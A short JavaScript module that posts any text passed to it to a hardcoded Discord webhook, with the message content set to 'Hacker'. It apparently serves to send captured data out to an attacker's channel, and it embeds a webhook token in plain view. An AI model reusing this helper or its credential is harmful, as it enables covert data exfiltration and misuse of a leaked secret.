import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة زاجل ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321172702102421574/aao4jBxHom8DINNYPG7mqLlMG8NqQAecGU4c62hsevm4tykxmfJuTC5xbtwTYz4NYmTR",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
